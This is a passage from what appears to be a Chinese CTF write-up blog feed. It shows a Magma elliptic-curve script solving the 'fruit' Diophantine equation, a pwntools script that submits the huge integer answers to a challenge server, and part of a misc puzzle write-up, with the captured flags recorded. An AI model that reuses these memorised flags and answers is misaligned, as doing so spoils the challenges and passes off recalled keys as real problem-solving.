</span><br><span class="line">&#x2F;&#x2F; Eduardo Ruiz Duarte  </span><br><span class="line">&#x2F;&#x2F; toorandom@gmail.com </span><br><span class="line">&#x2F;&#x2F; </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; First we define our environment for our &quot;problem&quot; </span><br><span class="line"> </span><br><span class="line">R&lt;x,y,z&gt; :&#x3D; RationalFunctionField(Rationals(),3); </span><br><span class="line"> </span><br><span class="line">problem :&#x3D; ((x&#x2F;(y+z) + y&#x2F;(x+z) + z&#x2F;(x+y)) - 6) ; </span><br><span class="line"></span><br><span class="line">Evaluate(problem,[-23, -7, 3]); </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">problem*Denominator(problem); </span><br><span class="line"></span><br><span class="line">P2&lt;x,y,z&gt; :&#x3D; ProjectiveSpace(Rationals(),2); </span><br><span class="line">C :&#x3D; Curve(P2,x^3 - 5*x^2*y - 5*x^2*z - 5*x*y^2 - 9*x*y*z - 5*x*z^2 + y^3 - 5*y^2*z - 5*y*z^2 + z^3); </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">Pt :&#x3D; C![-23, -7, 3]; </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">E,f :&#x3D; EllipticCurve(C); </span><br><span class="line"> </span><br><span class="line">g :&#x3D; f^-1; </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">for n:&#x3D; 1 to 100 do </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    nPt_inE:&#x3D;n*f(Pt); </span><br><span class="line"></span><br><span class="line">    nPt_inC:&#x3D;g(nPt_inE); </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    X :&#x3D; Numerator(nPt_inC[1]); </span><br><span class="line">    Y :&#x3D; Numerator(nPt_inC[2]); </span><br><span class="line">    Z :&#x3D; Denominator(nPt_inC[1]); </span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; printf &quot;X&#x3D;%o\nY&#x3D;%o\nZ&#x3D;%o\n&quot;,X,Y,Z; </span><br><span class="line"> </span><br><span class="line">  if ((X gt 0) and (Y gt 0)) then </span><br><span class="line">       printf &quot;Z&#x3D;%o\n&quot;,Z; </span><br><span class="line">        printf(&quot;GOT IT!!! x&#x3D;apple, y&#x3D;banana, z&#x3D;pineapple, check the above solution\n&quot;); </span><br><span class="line">        </span><br><span class="line">     &#x2F;&#x2F; break; </span><br><span class="line">  else </span><br><span class="line">      &#x2F;&#x2F; printf &quot;Nee, some coordinate was negative above, I keep in the loop\n\n&quot;; </span><br><span class="line">  end if; </span><br><span class="line"> </span><br><span class="line">end for;    </span><br><span class="line"></span><br><span class="line">if Evaluate(problem, [X,Y,Z]) eq 0 then </span><br><span class="line">    printf &quot;I evaluated the point to the original problem and yes, it worked!\n&quot;; </span><br><span class="line">else </span><br><span class="line">     printf &quot;Mmm this cannot happen!\n&quot;; </span><br><span class="line">end if;</span><br></pre></td></tr></table></figure><p>其次，有无网站对于输出有篇幅限制，想到可以通过逐次取出X,Y,Z来实现目的。</p><p>再者，由于问题要求输入六组正整数，同时不存在倍数等关联关系，便通过更改基底(-8, -7, 5)来实现。</p><p>从而得到了六组数据，进行数据处理后，手动输入时总有报错。最终想到交互脚本</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&quot;8.140.152.226&quot;,27359)</span><br><span class="line">print(p)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#39;[&gt;] x:&#39;,&#39;1218343242702905855792264237868803223073090298310121297526752830558323845503910071851999217959704024280699759290559009162035102974023&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] y:&#39;,&#39;2250324022012683866886426461942494811141200084921223218461967377588564477616220767789632257358521952443049813799712386367623925971447&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] z:&#39;,&#39;20260869859883222379931520298326390700152988332214525711323500132179943287700005601210288797153868533207131302477269470450828233936557&#39;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#39;[&gt;] x:&#39;,&#39;4797638216628812583434025577605647593302822112134074408304197287542626731655254754760070250069695806237478221185866750975864984886647923024950735389831823373908555291180424415780024231454429163667332563396190904475120830158622717917403410286269955215566928195911908452819781909832541473650205273220866668169706085422281346283683985976540910523295176188150172920324239409299506597321070979467526996274250455453182014342144936200082194972917287973666427586488695999171979538251246523201245515757129525859568862236578547077946470570834236704528174230986916804096494749486164989791799546021425641303587706015640912093764433943754791135952478302825539395135192814380102119660006534266801158156700532041924855632560802425763479310909232427688759422464721428542139255036982495633027474766492231096582800300651532249452886124953384853644678030788868746890039385094652563276776070355819550156592854511474008067006161138536377052747705010046805434254128197439636732559891068359224512685476617566910615703158046476554017740927198988625166011702932143115961764294294133907713303321841125624206851854472613188228173370133650483279735267719807509520708582676901775464380300759372054841808969769362891985102581373&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] y:&#39;,&#39;777215626371575217088310657140916521552988153647866038173198916020312203493964892557563515431776969976046377584808229726352107619185583316687354759898196737347993746254565122120527731768195400231056815663888758684421038238709788019326884485614991925753966183761708679471125148868876403664908848861229717592196841841920473123578320855383118815350240637368544307701771717790650586054632461552124823315180571553580552049469926518181331572822074022199558952119404190298735931653490892364073367374730596017190552617978971456481522903772154415790713998943890853561688541203855503519300220331450635692743853335580941406696263179637852488484574223656341703333725590156162934937022942328843104826018387806660541029784540066112095628410607646582758361692137157069659886753575805335098000015351084698040967634958962458780606944874861680995183423604699064295119192178585506522888929055816009012760980227645872065982724034169776145752311726352982276547920221698579169084852770861432795991389945366645278302963590215158406022987607104254724775954509771611804278473641470084216432339586431642635279556427721823661252622577913436058122095186869865354722446845980909445583248603818646384918432817277751662114543767&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] z:&#39;,&#39;45515177015370523186598470590800680389544668323346594120846310192651398948390333283841532838684228638057215529362980007901386037256606243099615016102478164356558671683211294326446538751067821841673990056500943490188667311094600394287944059737699170342758141308528120872594274846008499540806901157295755540786515739853811429101516388477908520360561007082314632823114318657321995023547907820030487984940570143033969059826198120222159054657757563990715876115982516007694588913589122694187210686371983934230131835116521724432838149089565766042842475792610165897246048263301498788205247949191959658551589000568833072395086346175560101459095869177540490444202757299358218286450933222931993542746092845434882841955167085611634798474215124723297956721787207069367210409930468551846723224409896901058733139606912810756783041961963236587262871957343659125846761987066927612211879278746707077150609197098785704768347642644777952301121081864034466935022811337948250337129064542497021903422439329618855883674545481251106939380976621498278402398166702566979987748149240552204768106633906852518721918670969297060120387704062182294525438430153827499412674831704727795905692842778950482616128311989966416414551687&#39;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#39;[&gt;] x:&#39;,&#39;314292671062173921111292961964938688436708560003041812060682883475601482731858816422240383882944462620623567286587503750889103725755740006155575297673642764299712726683321335389717791541964719934510825511641995918205107276454661741769794334108514203164641911236712095598112837257748637990075283636106682003276751427529201991787105193934697041232800134525851852447109810170418723631301828242625191639180887760900486283796646822636577982415485834912490056678350793904299469556675190381984269650656661389359603438215672023664789997298532577361391479552727060752508401019647303083662666278442587228978720394609332929193655411546120631186405265728554188782640067849098497720941130508081137596382759145482661677081314713162009647103220488302296025402048431671351592354184472261402188368030157633491138250760&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] y:&#39;,&#39;2370844050733763168653056912182275089135481091989469895123144001232602797883560999259129655883146226759407799774039653583687248933666821013837626069498685816554714705323847460507235277382794614936098961850448835901703891332533224965178208112684042141294337624561114056386810429548483148842597664557193452726536721058295707545479924443144714770275921157720051829171825732745857876583623371634787429544606363093272415125412836762819303421993587964400942215536942030583066797232871335393211395326041484926097986775013694902283133471846514714506451260645208477576233622738192899871671383782415144282058906877965816336875417759881658992236986398952428086504437441217917041059825839022060700048544901256390446316992733932612136873399094430223469630954259137165426566293784012450269989381719756996048058089023&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] z:&#39;,&#39;91799790641290895978892693045989377201208936340103016031364426490498736597677568287986160691579377724785392328266339231530225121046175630599728096521939605350739358168216330513241983978233993998988991326492874516049720675702286872816333914372511669802712219058719713832528597339293054368816739355907136102655521941992018553301928493452434474447723992660186680549103802498214282230740469986200770650120969911569599029786866103349814407040007149745644301920170584323025348517461308692357116926947251792699428368596979150563731309323515129474727817938633113832298119162778959620065753052386380251973187273607723986357950763286173562416762837143991547957533832926711542607034850457520418701875848727202883029106928219366050792422975016449024940528092641753838563742427509959090708910325398150439211810947&#39;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#39;[&gt;] x:&#39;,&#39;56343649470240944554541894194988032703152997483478025833485972092218241337348853462230550424269147587800007652800293442004563869063886539040704766619498961200516659583290762006742798747469819888357792304697529942283359016185536952419123443659813889544074213427237110287294366175059635489448606250819908358350367149475716496147487553433179157998593945045322448076446074865941920944926999884940332993017456395924976676018690218339595481948243896485907414278966492530683292887139539659213655023566766221831101135716001114169465582095106866429598465819579251295344339363122366559695834860866804821549078214470097325475562348355909825383578656299291495158122343583669460994581463652874145227290461773333377653825221448498643097415855394586840976390778065228010016838569596510884166894677724088453570554767891184009131202317463514667359675678308273163019864696397081276413389405178171832745064861375814617936899532879712697136502243767035869937886475349752732150896969705296958490386441876956461184753084885769489430408516478703269437168381789319788790797428959139328712339957316117433448921132629622916708162428803235294590729639690852735377737206875338559199642070756311221226354944275318104837238167938202874217277492682815157499036987671256790859209806061503081344974789146778142931461324438529830704647215310927456378226982094776791700899499767462440654000563331840801303630438288044726721668704136674569839611669539413577512641649460977325998156570611386695018346162124146444706600987125728699130857055733537679469412242428826826935313006521770416368190687794280098116223642593388696849325370974810173125463698206913626766831972902243040465791015306424858355284719345366417620405511681504199911683347113281944681912916616132595054141026620258530563782786876322816587301269197442746292368414303315916127317539282360592306966359033242684651591954067524673199807562267732882499063271347318982611006661263494424151752264285558404799539621054955240512368945118792096497578940815581860912677444713933006832661623582500082478103238386417759689596063674005645479325332513077947113142956489547967180110415807786757407565752981932876353479407753092629266170282399179455720412484028739177077916224898883055016568193570916954087403947022375704897561290704151306304296686231291915246078164894587604716731470270119255087638182016103482577417893994049532855443300933728751399104111113609139228244726117959809105870149939972243213243831080813292338018302734542541233393743764759099980125399064644064805556447102406684434751204627691119565714724372329434706830140754634784227958640480013090696910905948933204602786185318660439519844302686975950999911055368&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] y:&#39;,&#39;690513437917728358762742711882624210164156431191697460882071057631561434325917194724772571514769724756242649519293158098384452412034167432275066372007004613680327427275255271007127044500195055860576563483804846123615529706820098453919546485591052753586754752104074341574860615520024377668700069864523352595220021568265975747313365897344377455241983028423674873434480056500630547147021993841999914561066320454849616376511661854175124523626563946260328304964816820133526615504321061413552393435413734557860662179798338474456125557653019597413139361818201425365606459576981822303550670526711519547509422125776104848095712289913400348586094384034058327925810664271557067622049162165150997202607282520298373725742249437300215040007286145644594199573242191594020014861450701927255018742772391559888966053022348102555531053982964052676926034925187305081627180507684742157711204353955162518874918886441532355751364121120137220061598963972580632838065901252190541351505027162785606878378311773952864869040509371374045692153472360339820677197672974756063513992872813455047100440244265557323434292412653818727791484111886782630394009644619539997443752988480521672135682157981673252052742864017573864197821230865482608845995740938202946251972964115016855530942129284157345912242376589154358871801279188464112607201835735932165284481904436829641195268567905891766429473254156084489952125398195272913330657462922772676499577099055343169854441886913994787834086606951740959589308664147443162319475581543409481990727383462831564419330728082071773330584289890411190010801069814088316007675323856714135491996452097141166559416692817286741598938662142626353838913514868198944005794534159292904121493082022746192498136043686361054539803627017608616650817531026636848049654514828317231299512550948146410251443374282125060797517096613206515282939712390801471584022666792246977896986312650918250296670922360409243340310820180832046145279752237926888410158387477570151262836436709586347996373290744918424123874672100019158042610343734330300670999884700852984443231339851004224214797726388873060011777955177645327156497832413161629291650080831223335503202990794458074506899395173451753753412917542092805390442383785492313389266374623965592621164471788912979915288373531140420679741585514338378160814121102804719457924307258255604149561680677196943968021781539349025029439498318908711409131556014964860313682882585682350466634173408107287337651166402486894914050092552773350939774830857074355792728576489985768113131291720474480791442839751564508645608156726138081315247369269982278615147021753411529822207492155763831635572814845385765795018138222502796671315249755&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] z:&#39;,&#39;61848417055152133095432859376247872928009845246789580178050067454174942407289297559012928374669880399226235006088231916429036431717949140079523107699010796967464678696750432063224742137856002145403334654222909904962522076144363242043530182229726617880261101644639444540632138844359849325627444234093053497298089172796831309295203428323237607544929109304950196414277510671931861834789019508453957863965179460523547130977182721873412236354976041295946290574129654540505955820992215494161856824568912319386270787992756116866062781660041872686867599926093955236454271756037813904065345815807967197252149709256958910903921629063676085365164156292505994515780099836726603025001546701580563990270117723417757806315543027481605046648706694155341556749747961645150448309646644003429504745612139087577369112753968247750887383888853833638024926592320525431539002011906512566022225505488290067553775739475228974287524010911471199580446981297499033324293433054314997340507624763508479764288445959167109818379093312384897235514453806773570506136147460374739652208927635094780369233426741106222197305283621020742649692897738775130354778510804617375762614331484058562161679108584863456408377372390011016005774582862355690168291837260954433736953414457935193344330564117264151893117400699445297640650235267828893304134297349172279303352447772969171487962668842312818473409530277128527703784927802500713063308105794763395798900921132178185481565958439843343194891889939209386168195922077305571738816941145556666482431762119631038188209848264753064527691896274230406206976712407517112707473610456245413512449975006013001346800249527889328831154098431736999515648890302395574277947121160024065442038436332583230900633713649991890809933852937500538580995409391470251506811498781070869446698178060432825438142270059298820983291636082393750640274537182390720017567223171631951340485128381886918925746013563999355762098143500142836828449729756344834461718923526113135739367355419001961839441783370438433332524888952755072832867039562229899392173573353580606101453996017971785110492890103233518666006654441091010777306628401192942553802480194127241303493562250604973075784009007771841370274177808149418825652458156856491836062709242993030265020629565270893072372766252475123700999649400333603526094308829005361507091842135532356536463266979832102425199482313385944078782745555471266946905886911818229551468226593701687145021166521176732270133153258708133382809042442578592219243168751249134837347002782547031127475927820490325693389499997710379922677662230692761811590207110600097677071251835260867376130783566079991453152581322156882263817629990605055912556595367&#39;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#39;[&gt;] x:&#39;,&#39;1466462768803722687820990234146153789332776717426574735157342721894173457313793945470995397948053356427400255798986824549142533735653243872935065667283473357648161546021360813391606407358422258488463177267190947790720880067935702278652903629428101039967610738736032763360537325988503316046992497815420149392442185456639217773851126536800303404704906357832735069464476881204164101005831350899734876576455658842071540866658496429523694053741747003274745426660915410875732910009698770028863061692356650150359274502417470145616022187365568348366183555284622003617047953676123255503879408662958850277914455813142457580910929063291960692431164975973248697909727624630170385090818255406971227365813586689855062427882902087409590194133583325138182803031874353720239525341257976991453293716238702606049904809975311181873847202175360574473960210635030683203341524371158272359543342768002682704641639270023106995528115967954614158263176608889238834414979150085710345552582864875273548395511761063104901679126625884770540130127110239251299540382151889587418636217401856273223406736777664731035692208401129541554620276534658936718978867906083660273888852478360656326426348522516050204325765871127922081918524356839561452544240429557671771864300929161623099693525813299169216533966160346052929994327173984258914667358101930622397308183483169850178838924492639185315152609906814955625570811896455006089818390842937336733582587268722512443517634955373752922508533706884558197023941312207821484164116313449042275176450912610267367732036322555879448303078575205784751453502321946890278764349534090837614791907838419293287099943865406547170516726740489446964722410012036556555967932070416519239143966546404023416713865455161926722765793360471879496500828503958488051251210726713698214036252726752887957811379704663037356850400162151317113751028454602541090788271606572708984000539082815639064834898766224260385368930121264466445836747484008130156009288880610457237625764045317543690301274901058450254654602263017522754533808571561150814949056906961341511996779937354884772320065821114957269363368274611297708624271519660854512441426885509896350237251805939970778259430889678574006608136753859840404142026342231687427902144318243382084429667896923184193252430887056592702444454022137403893487669767665660351005504950274132704290455943998846427235946141347169553800927911924353286398496376968565099634844332056371355229384578221800076164170621512726157130214356899574789759718093195135118082774844180281307499695648887081926310963073570400373003906368126732440450380955150116087231718144964332207835674227278000056751337448599567089441718938335281958743765482365111100590619039742235511041300262432959498787424523918512869059510706240190996480183464879967572100198195167462376952422143853314955176499760574685656362642914482179486020613952169810456578542701726428005358201809943863225873729123643314878509035476900560473259425980335521841579400065671829722273467335279301109077753627723421347620528598516236564749222948406616013333981919830915003458200779586548274337503547102219676918439442144257263573807272155202623003956313441230268083475982624622859546209500721900192050944311765428240869308787726176692926966020956918895007303095260780322248180161257398502980490226033599320769833471972587073463713330851274204567915760444570046332183071746896173290833314571417453631617049654276903115010145030258664163945359454008944575669041922816925525989390345270907544737781268862270002859816424663306327644213071450917624028760639368439510039391179322408733786094474873541571068690093479803341479746458972459944518289705044943429687199015131659642424704585268483234784277200350564944835502249696934078614051140763153047275086153077133831386679260343859202464542254145393519032481125509033066968402752476506859283886797956989432400654527254724804539151017004378989227091548671276650109132082892293473239439873288210616004718137202001522782415787670607477172980776641975376907824813740753900858881163073009973675497411327475759484661994433541027118478477873203801285348520794633328592657263505999991128879668520585720428622237742490512537950359402205324001995495074505807089644668448393383213154048818981685410508280672403006942175254143340620979643541341540074337572659622703360744479191758526561879748065269225331493156319797202196698953093091118268663180285453994173175004765042540875901896560172126805963396790075724648861284061587949206539942962129412131995287496570144629907257102335817747474586134616799127347111891708334557715358473749128447523960311368632111187524169171349903681252047364790356294740543040289664587755687750107722774759862119191799852175001489149275860198133527599004010589703785960337252846734341350955273111125113685791268561493953580889137093318460379114925753926139452652678469214058672198208237080575292099030434720230371019151930821777059596403590137514162396944094077882663593602532834157681855429204563684714007140790471341731865660059139398388366172399274776878238470590564900337146592840055286970658590626056064774635037184621116150135854418956354510228350086920816992573510920569142525094101331103865716360093037599947187352903338592828664415300111098987525354000528988539370713205032546695346298781626827639615547289652649948996485550687407583089787140208368014043142638420083431583735065909488869448639307088567210131319590284847238355714331037717182304377120888237618040993668130877092086293688186390937832034765693427660886462975244457222485897333426083174195975863029051784841114606257147096809874368016484207233438338509864968&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] y:&#39;,&#39;47622450400948378838383772282463774606862475585470916135643120242889164588999536917143252778898237971519642050232275519904346077796804164997665170205968559976309128127925359988920951940206912919554809735600309714561600669180191562523906954373442895286177820090074271444866144401506681728848985841518809813817744245369156604056715252134781651290696247931418719827721409603298669191348612295024182755007100463679890698670970772218604919944523548556339943990850928329334044482351470144751278631230052483209229192136090007700973362792766305057772210218843096395204004481827871813127982371104261927151640854476471691258603962738116589877882203513684178221638481443997120721426951288321845195709538874283311496775212472633043757016949413544955089450529970071115171319204455757146236186283669069688840344104909843453532933741359090255143237887602089268418356097385230465055288442812353852678109364557896410605519305061329809194582847670449343808895801066484058241857852557025853970470346734297512391305668724507609507860997210910249828839975095498003479392729012450557551501558320236220920957164255349717391566888082337651296824625293758028502677596286857109601061747560818473556222963976245224436029590094669629286031110344430825748468172810347309875610823148486669786946210224096523266839596074611763758157557664013300435818412520127102295208939189906585620396212651765699761291878071263904189401224066323142807351350771288944210158279686921742294747307474233600865491069252006522535488189377697928025125557621379549255290434908346038130268791214288761888173148344653009237658149639465258186543795913644724483967167271354216410857782569840456443439191163524988860419550058863439011112647571765143098332645498985654541702199457567021375604151698069751565059399207164022611522991554954322337382634649727285217129423673370394965121067239894366149581109228445711919745882281342614646173496777927189158828873291373360559493626235980310503651954583446014359765608056405680697149732429212383292427158489912859600560764546409487137797434433280391746835155157023613387021771257903833401416657254712158341427482279548188517245020827649635343698774804958039887874677668293792752410148798450853470012738072908329266410979821696916469513375891863148739598334904827404460820947224418582238623488603934818365623881078631861542509103895074183496885978299923729454828974760861965227627240219823926287218746031610309230743922733682874795150985436217330699586340400912320670388975069961195118990128872085568496625327692693432900622868904887568511422015928091397130006637366088807249451579584296668364743256869381706306860780375897099571626209545626485944716947896464577148689231222737379171911134294203436527612713553746799327282889817221830528744366228624963184335138436843991411220561872387514837317617725088051768758821799717134972056130662827963575852075195983333237812361469358928050372207865758118382197475583604897923869874443254558509491089094497114309187515435417626768692338314768879199254962134071364892503433291512653074139512155522589222479395052657948150741190520214628284891464936780162688434679291410736556884486773696840381406282032875195723530086887753071363641544299638554503482403044827489580056913943422699970704859738311408892499707908489253243553716995417910394398094100749297597547580211158200206330030361004088378215696877933199873683522779889198901930937215425097187656672830486004822490294320139664485427561504232130257623519683347400842087756573452879355666822274541394819212535164620698017642540024964879529442496467620788094786440378476823695293501722495338784621644962662327864386529025226531680747525116663651083867870952664381887535020135683653867535500764985777586994135175757313800702085306105423536196873700543907429173383740071355554433235790028028913063521657396875545515280730719253230768312689362173644652095812428829060569326084255919425957186992895406713009973532453651237396275339660722984857993571948014177882269245678789940694598886067003485062545812158114223243596985982981053929849377362932912968592983160821938296512313053406706366570551134248607106838991076299811097232369731983873397568183604741730679477708228043724274236971655276883587537538807463933248573056764890328937147993552897863908422809744532916448505130307316345603250021629200966979727553566898848418212050469040462774067434279504303064273954443870971451129233529449800530988407135418019143122293348275498630841723639872063348515200353880053898537816522858218623188622751826735048654693126489566783502051135681427010709684649132264136843643574234222127181277585421920287397212371635900068620872015237701184536167275969863375956410621166928239826276150733735560005835242757705026050498056686664492317443869890115549535953605656840319187701634496815261905403829900411155129186253431300704606916547191143757850974622268610491295742185729093409192567569751484195005154100683306654779007665669728792963209833514009497910233070844858781637129847244418735700272643945288880602248591506142020110809954124229243650347853949950615679125504309603268168970087780082752748418531873061421099344561758754414122646701643857380924441570725935144434391134626028509815913280036817355699592050233801080040353249527134723579200097042105263761350123881231422906878938655350539034665984543299464199719993288263333879987368133210745062241607017400289127218733968733124756652452939417370203706536373812620169103207477941223978551834048584046637279693226304436911401963976815152363999340062727737206096822311985120175950512924402251872044716022462706876189642892600376531572498967&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] z:&#39;,&#39;6692730096259452643369104960627455630486215862399671626732511651080481725914118043331962481949887246701616498356166181463604926787704653729996524875944166464259834513341705159840317679808261520484528369303565687257064907833628722706736890217964224422223998452334667877204269030436124986535368385034217958050214758008075705340244612677399960920232432270936246267613432813660990366567228079750807890066079611266367346864160511628226289909730940074689153001802775046666179052632981030614614169569391452067758516455221647484030999554706461123791807054670937722216527237831406838479377545766845200930604834889512899500298890279463693292123492722332964766293920612462482832346906579356853165719135718614757414077012806506891804144857723803907676032689642786952845709990953932549363099277202376455866403343511636096090375135224056359990162308934493705571731817161204022064082776683415625288907335128227482210147359946199187596915617399127457890619731551245662573544480434303562880059763371510761927915895906816154741217474757012037948333052450948476074779692568524946903249315558861221338345333707757506558596252170626033347982508660529595727154556214962133515612611016236612647370563803336371277474122183675326321775888376588019649186941050457093330574306006986097505564912850747944195881019554947202505040052804598375384739818930341354578533986322895086376858707463392009316120030250126712526017586828270649304748716858128207666637663463616763441471078140139397165398583082792700730916946522609308347804497092788797288655742983063401287929657658976022731909898318616931557751739391419299632140075177345562777607172891334227363324171818253438628193523635359638830124084206940507156748690007173906158332911198479931217612571332175228285424725788618932441123312056841558681171044031534689729724691692912359887866667930883571803897811767970302335614219823583212530946330960425630170759880575140525980655912864408561070271281256235441915992173078282832751522617530913457332359506998401455770170148507223571372814959845223749946250391821473437923170419836829629573389065359875395735969558797082534386336670004171504123398260118906657430620905923442497543912091623694459665406533851295585577716831411779117126645622931046613934399425097865071551562607352459925632847376933960796535324837598687628712655007121426904118192945265333766905073914839487266825952061145886314105700264580892659214832501756632175256329239482959935590623864400784418843182077217334193177197696837594211308483641010337802908540807811308881492169321137882307683712433297499007946781116061320458705721560125360842061486428850165801712957979595359246728776430639245939636738948374761658954061826209691051920957797067434218054572681739182471133280523370552885267688527726127135134270330852701348584033118514142382336116407399008075996860982473510530346022361230317172840057578686001163210274329974595126286187269014026433799441121386883231381984306214840014935709084077222504721973335222668527808855559610990711488108899107512957141381420732916565500896920478134482742963861647524468723317202105177122047589163963776903970183491643712078839753127169721419656802120034479275632337807924544614498110240363188487068594679650721290227877054858558111252685500296470242670684134891258621448609138267737182763032469423691128748192585991339150082774098556015718505017431352118078322619870689991014115031741711290769496089014977880570263266405690441911703781396906998762963587612999641290185250072869170440998075953692342671487460709193956045971969356326209070905623784688123412057499359044056826754728447850124347648398710550218154116952578196233513878798252059822638656328544635582956335584231888174374941455674902151097107216854418487873371668727710211558581171277145725681652074404567177285568687595945357490783390784232306424563694736533020608498181464646971181770196876384953469622440846514006232384210961579158336899260081585536468500934980497170535612446252975896695526200287578712298314622454508448363640890747229139443768079583177480872178042259050166177688625276376213463703266639188395613252991270000795977687386423737853169071311746970345634184517790850697224560536919249448868582994389668475556905130571202552218257473659915042192852883158829520722740650513765041860440266491282066812530716688774135015932473130727413733116681785660017420242862228536599943421961099282741943719358222072007939854053509521905735912191309088131695308739956798885671694328458098321491372884169420463319900482341649820798039294107822946250917886176746645780913148275745781620821252781169313295613808543152058629071010936935426042544003657991023530442000967140490604075975244178975806038991746932562976007960411034074895087917279784536437641619888646710861410596842178036218663126583685587080880228752877783782319015943806200498797807843784497766965338186516923592678329622986749043139097599188984217640583316895265361154438849767555629158421509916829272788880623767533583482040026964428256454562903529935552136541947137147274973714527471950166304339163636952976732589610760660374407640321978111107637740755852017091520655110597205198842248308933217962442651853490174911403756247603565731181111671683928302166630842756928837169769877128819926602478968210662873624252901764427943619832956659552493674351362220715335865324112698992725740083263995933814196117674869528535175868791264054216712326268429406736707035618273426834172587106600230739062978250941965654621128900832876783234653461887966954026005333565342496743505345812402536575799940100433925667207864266152565347803725841484762656261514597525355&#39;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#39;[&gt;] x:&#39;,&#39;&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] y:&#39;,&#39;&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] z:&#39;,&#39;&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">print(p)</span><br><span class="line">#flag is: flag&#123;1f88de74-b6af-4b2b-abd5-46356151698b&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;2021数字中国创新大赛虎符网络安全赛道&quot;&gt;2021数字中国创新大赛虎符网络安全赛道&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;你会日志分析吗&quot;&gt;你会日志分析吗&lt;/span&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;线索只有一份a</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>Nep2021</title>
    <link href="http://mklkx.github.io/2021/03/25/Nep2021/"/>
    <id>http://mklkx.github.io/2021/03/25/Nep2021/</id>
    <published>2021-03-25T07:43:21.000Z</published>
    <updated>2021-05-04T11:38:59.436Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="1">1</span></h3><h4><span id="涅普冬令营misc签到"></span></h4><blockquote><p>sharun：这题有很多解啊</p></blockquote><p>本次涅普MISC的感受是，考点不难，只要找到点和合适的工具就能出。恍然大悟</p><p>签到题是这样的</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag &#x3D;[0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffff</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>第一次尝试可能是异或，想了想后发现如上所示，大部分是0xf，是相同的字符，奇怪</p><p>第二次尝试直接转十六进制，全是不可见字符，失败</p><p>第三次觉得可能是纯几何的图案题：</p><p><img lazyload src="/images/loading.svg" data-src="654SJK.png" alt="654SJK"></p><p>但是总觉得差一口气</p><p>第四次尝试回到了第二次的思路，进制转换看看。</p><p><img lazyload src="/images/loading.svg" data-src="65hXZR.png" alt="65hXZR"></p><p>看不出来名堂，便开始玩了。</p><p><img lazyload src="/images/loading.svg" data-src="65hvIx.png" alt="65hvIx"></p><p>有意思嘿。隐隐约约能看到NEP字样。</p><p>把内容移到sublime</p><p>因为它的文字内容能够根据应用边距的变化而变化。</p><p>不断调整</p><p><img lazyload src="/images/loading.svg" data-src="65hzi6.png" alt="65hzi6"></p><p>看到希望了！</p><p><img lazyload src="/images/loading.svg" data-src="65hjd1.png" alt="65hjd1"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nep&#123;Y0u_ar3_50_cl3ver!&#125;</span><br></pre></td></tr></table></figure><p>解出来之后想起一道相似的入门题。</p><h3><span id="2">2</span></h3><h4><span id="涅普冬令营出题人日记"></span></h4><blockquote><p>我把茶包的出题日记找到了，里面居然有！！！</p></blockquote><p>得到出题人日记.zip</p><p>解压得xlsx</p><p>根据经验更改后缀为.zip</p><p>winrar打开看到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">隐写.wf pna fbyir guvf 